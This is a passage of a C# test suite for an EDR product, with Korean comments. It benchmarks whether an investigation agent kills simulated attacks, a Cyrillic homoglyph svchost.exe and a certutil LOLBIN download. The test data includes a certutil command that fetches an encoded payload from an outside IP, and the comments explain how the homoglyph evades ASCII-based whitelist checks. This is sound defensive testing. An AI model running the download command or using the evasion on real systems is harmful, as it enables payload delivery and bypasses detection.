        _output.WriteLine($"[시나리오 9] {result.Name} | 기대: {result.ExpectedAction} | 실제: {result.ActualAction} | 판정: {result.ResultStatus}");
    }

    public async Task<ScenarioBenchmarkResult> RunScenario09_UnicodeHomoglyphSvchostAsync()
    {
        var (tree, archive, agent) = CreateTestHarness();
        uint parentPid = 1009;
        uint targetPid = 2009;

        // 키릴 소문자 'о' (\u043E)가 삽입된 경로
        string homoglyphExe = "svch\u043Est.exe";
        string homoglyphPath = @"C:\Windows\System32\" + homoglyphExe;

        FileInspectionTool.RegisterSimulatedFile(homoglyphPath, new FileInspectionTool.SimulatedFileEntry(
            Exists: true,
            FileSizeBytes: 142336L,
            Sha256: "9999999999999999999999999999999999999999999999999999999999999999",
            Entropy: 7.4210,
            IsSigned: false,
            SignerSubject: string.Empty,
            SignatureStatus: "NotSigned (TRUST_E_NOSIGNATURE)",
            IsPathMasqueraded: false, // 단순 ASCII 비교에서는 System32Binaries와 불일치하여 false 반환
            IsDisguisedExecutable: false,
            AnomalyScore: 35,
            DiagnosticReason: "System32 디렉터리 내 무서명 고엔트로피 바이너리 (키릴 자모 위장 의심)"
        ));

        try
        {
            tree.ApplySnapshotBatch(new[]
            {
                new ProcessEvent { ProcessId = parentPid, ImageName = "explorer.exe", Lifecycle = ProcessLifecycle.LifecycleSnapshot }
            });

            tree.ApplyDeltaEvent(new ProcessEvent
            {
                ProcessId = targetPid,
                ParentProcessId = parentPid,
                ImageName = homoglyphExe,
                CommandLine = $@"{homoglyphPath} -k netsvcs",
                IsSuspended = true,
                Lifecycle = ProcessLifecycle.LifecycleSuspended
            });

            var target = tree.FindActiveNodeByPid(targetPid);
            Assert.NotNull(target);

            var res = await agent.InvestigateAsync(target, cmd => Task.CompletedTask);
            string actual = res.VerdictAction.ToString();
            string expected = "ActionKill";
            bool isPass = res.VerdictAction == MitigationCommand.Types.ActionType.ActionKill;
            string status = isPass ? "PASS (TP)" : "FAIL (FN)";

            string failureReason = isPass ? "유니코드 동형이의어 위장 및 악성 C2 탐지 성공" :
                "ASCII 기반 파일명 매칭으로 인해 System32 사칭 화이트리스트 검사(CheckPathMasqueraded)를 우회하였고, 누적 점수가 40점에 그쳐 사살에 실패함(False Negative 미탐)";

            return new ScenarioBenchmarkResult(
                9,
                "Advanced Attack (Evasion Resistance)",
                "Unicode Homoglyph Masquerading (Cyrillic 'о' svchоst.exe in System32)",
                "T1036.005 Masquerading: Visual spoofing using Cyrillic small letter 'о' (U+043E)",
                expected,
                actual,
                status,
                isPass,
                res.Confidence,
                res.SummaryTitle,
                res.Narrative,
                res.MitreTactics,
                res.BlockedIp ?? string.Empty,
                res.Traces.Count,
                res.Elapsed.TotalMilliseconds,
                string.Join(" ➔ ", res.Traces.Select(t => t.ActionTool)),
                failureReason
            );
        }
        finally
        {
            FileInspectionTool.ClearSimulatedFiles();
        }
    }

    /// <summary>
    /// [시나리오 10: 다단계 LOLBIN CertUtil 다운로드/디코딩 (certutil -urlcache 후 certutil -decode 조합) (T1105 / T1140)]
    /// 공격자가 certutil 시스템 유틸리티를 악용하여 외부 C2(194.165.16.11)로부터 인코딩된 페이로드를 다운로드.
    /// LOLBAS 프록시 악용과 인라인 외부 C2 통신 지표를 종합하여 EDR이 사살하는지 실측.
    /// 기대값: ACTION_KILL
    /// </summary>
    [Fact]
    [Trait("Category", "NeutralBenchmark")]
    public async Task Scenario10_MultiStageCertUtil_Malicious()
    {
        var result = await RunScenario10_MultiStageCertUtilAsync();
        Assert.NotNull(result);
        _output.WriteLine($"[시나리오 10] {result.Name} | 기대: {result.ExpectedAction} | 실제: {result.ActualAction} | 판정: {result.ResultStatus}");
    }

    public async Task<ScenarioBenchmarkResult> RunScenario10_MultiStageCertUtilAsync()
    {
        var (tree, archive, agent) = CreateTestHarness();
        uint parentPid = 1010;
        uint targetPid = 2010;
        string mockB64Path = @"C:\Users\Public\loader.b64";

        FileInspectionTool.RegisterSimulatedFile(mockB64Path, new FileInspectionTool.SimulatedFileEntry(
            Exists: true,
            FileSizeBytes: 52400L,
            Sha256: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            Entropy: 5.9200,
            IsSigned: false,
            SignerSubject: string.Empty,
            SignatureStatus: "NotSigned (TRUST_E_NOSIGNATURE)",
            IsPathMasqueraded: false,
            IsDisguisedExecutable: false,
            AnomalyScore: 10,
            DiagnosticReason: "Public 디렉터리에 다운로드된 Base64 인코딩 페이로드"
        ));

        try
        {
            tree.ApplySnapshotBatch(new[]
            {
                new ProcessEvent { ProcessId = parentPid, ImageName = "cmd.exe", Lifecycle = ProcessLifecycle.LifecycleSnapshot }
            });

            tree.ApplyDeltaEvent(new ProcessEvent
            {
                ProcessId = targetPid,
                ParentProcessId = parentPid,
                ImageName = "certutil.exe",
                CommandLine = @"certutil.exe -urlcache -split -f http://194.165.16.11/loader.b64 C:\Users\Public\loader.b64",
                IsSuspended = true,
                Lifecycle = ProcessLifecycle.LifecycleSuspended
            });

            var target = tree.FindActiveNodeByPid(targetPid);
            Assert.NotNull(target);

            var res = await agent.InvestigateAsync(target, cmd => Task.CompletedTask);
            string actual = res.VerdictAction.ToString();
            string expected = "ActionKill";
            bool isPass = res.VerdictAction == MitigationCommand.Types.ActionType.ActionKill;
            string status = isPass ? "PASS (TP)" : "FAIL (FN)";

            string failureReason = isPass ? "LOLBAS certutil 악용 및 LockBit C2 통신 성공적 차단" :
                "certutil -urlcache 악용을 정상 인증서 캐시 갱신으로 오판하여 방치함";

            return new ScenarioBenchmarkResult(
                10,
                "Advanced Attack (Evasion Resistance)",
                "Multi-stage LOLBIN CertUtil Download/Decode (T1105 / T1140)",
                "T1105 Ingress Tool Transfer using certutil -urlcache pointing to malicious IP",
                expected,
                actual,
                status,
                isPass,
                res.Confidence,
                res.SummaryTitle,
                res.Narrative,
                res.MitreTactics,
                res.BlockedIp ?? string.Empty,
                res.Traces.Count,
                res.Elapsed.TotalMilliseconds,
                string.Join(" ➔ ", res.Traces.Select(t => t.ActionTool)),
                failureReason
            );
        }
        finally
        {
            FileInspectionTool.ClearSimulatedFiles();
        }
    }

    // =========================================================================================
    //  10대 시나리오 전수 일괄 실행 및 종합 벤치마크 리포트 도출
    // =========================================================================================

    /// <summary>
    /// [10대 실무 엔터프라이즈 시나리오 전수 실행 벤치마크 슈트]
    /// 10개 시나리오를 연속 실행하여 실측치를 도출하고 통계 지표(TP, TN, FP, FN, 정밀도, 재현율)를 계산하여
    /// neutral_enterprise_benchmark.json 파일로 저장합니다.
    /// </summary>
    [Fact]
    [Trait("Category", "NeutralBenchmark")]
    public async Task BenchmarkBatch_ExecuteAll10Scenarios_AndGenerateReport()
    {
        var sw = Stopwatch.StartNew();
        var results = new List<ScenarioBenchmarkResult>();

        // 1. 정상 업무 5개 실행
        results.Add(await RunScenario01_PyInstallerAsync());
        results.Add(await RunScenario02_LocalBuildAndDebugAsync());
        results.Add(await RunScenario03_IntuneSccmDeploymentAsync());
        results.Add(await RunScenario04_CorporateBackupArchiveAsync());
        results.Add(await RunScenario05_AnyDeskRemoteSupportAsync());

        // 2. 공격 시나리오 5개 실행
        results.Add(await RunScenario06_DllSideloadingOneDriveAsync());
        results.Add(await RunScenario07_MemorySleepObfuscationMzWipedAsync());
        results.Add(await RunScenario08_RegistryIndirectRegsvr32Async());
        results.Add(await RunScenario09_UnicodeHomoglyphSvchostAsync());
        results.Add(await RunScenario10_MultiStageCertUtilAsync());

        sw.Stop();

        int total = results.Count;
        int passed = results.Count(r => r.IsPass);
        int failed = total - passed;

        // 메트릭 계산
        // TP: Expected ActionKill, Actual ActionKill
        // TN: Expected ActionResume, Actual ActionResume
        // FP: Expected ActionResume, Actual ActionKill
        // FN: Expected ActionKill, Actual ActionResume
        int tp = results.Count(r => r.ExpectedAction == "ActionKill" && r.ActualAction == "ActionKill");
        int tn = results.Count(r => r.ExpectedAction == "ActionResume" && r.ActualAction == "ActionResume");
        int fp = results.Count(r => r.ExpectedAction == "ActionResume" && r.ActualAction == "ActionKill");
        int fn = results.Count(r => r.ExpectedAction == "ActionKill" && r.ActualAction == "ActionResume");

        double accuracy = total > 0 ? (double)(tp + tn) / total : 0.0;
        double precision = (tp + fp) > 0 ? (double)tp / (tp + fp) : 0.0;
        double recall = (tp + fn) > 0 ? (double)tp / (tp + fn) : 0.0;
        double f1Score = (precision + recall) > 0 ? 2 * (precision * recall) / (precision + recall) : 0.0;

        _output.WriteLine("=========================================================================================");
        _output.WriteLine("           PHALANX EDR NEUTRAL ENTERPRISE STRESS BENCHMARK REPORT");
        _output.WriteLine("=========================================================================================");
        _output.WriteLine($"총 테스트 시나리오: {total}개 (정상 5개, 공격 5개)");
        _output.WriteLine($"성공(PASS): {passed}개 | 실패(FAIL): {failed}개 | 정합률(Accuracy): {accuracy:P1}");
        _output.WriteLine($"정탐(True Positive): {tp}건 | 진음성(True Negative): {tn}건");
        _output.WriteLine($"오탐(False Positive): {fp}건 | 미탐(False Negative): {fn}건");
        _output.WriteLine($"정밀도(Precision): {precision:P1} | 재현율(Recall): {recall:P1} | F1-Score: {f1Score:F3}");
        _output.WriteLine($"총 벤치마크 소요 시간: {sw.ElapsedMilliseconds}ms (평균 시나리오당 {sw.ElapsedMilliseconds / 10.0:F1}ms)");
        _output.WriteLine("-----------------------------------------------------------------------------------------");

        foreach (var r in results)
        {
            string mark = r.IsPass ? "[PASS]" : "[FAIL]";
            _output.WriteLine($"{mark} #{r.Id:D2} {r.Name}");
            _output.WriteLine($"       분류: {r.Category} | 판정: {r.ResultStatus}");
            _output.WriteLine($"       기대: {r.ExpectedAction} | 실제: {r.ActualAction} | 확신도: {r.Confidence:P0} | 소요: {r.ElapsedMs:F1}ms");
            _output.WriteLine($"       수사 도구 체인: {r.ToolSequence}");
            if (!r.IsPass)
            {
                _output.WriteLine($"       [원인 분석]: {r.FailureAnalysis}");
            }
            _output.WriteLine("-----------------------------------------------------------------------------------------");
        }

        var benchmarkReport = new
        {
            SuiteName = "Phalanx Neutral Enterprise Stress Benchmark",
            AuditorRole = "Neutral Enterprise Security Auditor (Red/Blue Team Lead)",
            ExecutionTimestamp = DateTime.UtcNow,
            TotalScenarios = total,
            PassedCount = passed,
            FailedCount = failed,
            Metrics = new
            {
                Accuracy = accuracy,
                Precision = precision,
                Recall = recall,
                F1Score = f1Score,
                TruePositives = tp,
                TrueNegatives = tn,
                FalsePositives = fp,
                FalseNegatives = fn
            },
            TotalElapsedMs = sw.ElapsedMilliseconds,
            AverageElapsedMs = sw.ElapsedMilliseconds / (double)total,
            Scenarios = results.Select(r => new
            {
                r.Id,
                r.Category,
                r.Name,
                r.MitreTacticOrDescription,
                r.ExpectedAction,
                r.ActualAction,
                r.ResultStatus,
                r.IsPass,
                r.Confidence,
                r.SummaryTitle,
                r.Narrative,
                r.MitreTactics,
                r.BlockedIp,
                r.TotalTurns,
                r.ElapsedMs,
                r.ToolSequence,
                r.FailureAnalysis
            }).ToList()
        };

        string jsonContent = JsonSerializer.Serialize(benchmarkReport, new JsonSerializerOptions { WriteIndented = true });

        // 리포트 저장 (실행 디렉터리 및 기준 디렉터리)
        string baseDir = AppContext.BaseDirectory;
        string reportPathBase = Path.Combine(baseDir, "neutral_enterprise_benchmark.json");
        File.WriteAllText(reportPathBase, jsonContent);

        string currentDir = Directory.GetCurrentDirectory();
        string reportPathCurrent = Path.Combine(currentDir, "neutral_enterprise_benchmark.json");
        File.WriteAllText(reportPathCurrent, jsonContent);

        _output.WriteLine($"벤치마크 JSON 리포트 저장 완료: {reportPathBase}");
        Assert.True(File.Exists(reportPathBase));
    }
}
